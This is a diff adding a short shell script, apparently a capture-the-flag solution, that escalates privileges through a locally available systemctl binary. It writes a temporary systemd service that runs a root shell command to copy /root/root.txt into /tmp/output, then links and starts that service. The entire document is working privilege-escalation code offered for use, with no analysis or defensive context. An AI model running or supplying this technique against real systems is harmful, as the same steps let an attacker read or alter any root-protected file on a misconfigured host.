@@ -1,0 +1,12 @@
+# Create service
+# When started it will copy the flag to /tmp/output
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+
+# Link and start the service
+./systemctl link $TF
+./systemctl enable --now $TF
